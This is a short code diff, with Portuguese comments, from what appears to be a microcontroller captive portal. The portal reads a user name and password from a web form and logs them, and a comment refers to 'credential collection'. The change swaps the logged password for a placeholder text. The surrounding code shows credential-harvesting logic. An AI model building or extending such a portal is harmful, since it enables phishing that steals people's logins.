@@ -107,7 +107,7 @@ void setup() {
     String pass = server.arg("pass");
 
     // Enviando dados para Serial (DEBUG
-    serialString = user+":"+pass;
+    serialString = user+":"+" SUA SENHA AQUI ";
     Serial.println(serialString);
 
     // Anexar dados ao arquivo de log
@@ -116,7 +116,7 @@ void setup() {
     f.print(":");
     f.print(user);
     f.print(":");
-    f.println(pass);
+    f.println(" SUA SENHA AQUI ");
     f.close();
     
     // Envie uma resposta de erro ao usuário após a coleta de credencial
